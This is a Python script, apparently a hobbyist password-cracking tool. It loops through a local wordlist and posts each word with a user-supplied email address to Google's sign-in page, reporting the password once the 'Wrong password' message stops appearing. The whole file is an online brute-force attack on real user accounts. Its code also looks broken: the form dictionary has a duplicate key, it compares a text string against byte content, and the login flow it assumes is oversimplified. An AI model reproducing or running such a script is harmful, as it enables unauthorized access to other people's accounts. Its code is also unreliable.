#!/usr/bin/env python

import requests

# import the target url and method
target_url = "https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
email_addr = input("Enter your email address:")
data_dict = {"identifier": email_addr, "class": "ZFr60d CeoRYc", "password": "" ,"class": "ZFr60d CeoRYc"}


# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open("//home/Mitch/Documents/Password_Cracking/Wordlists/19cred.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Wrong password. Try again or click Forgot password to reset it." not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[+] Reached end of line. Try another wordlist")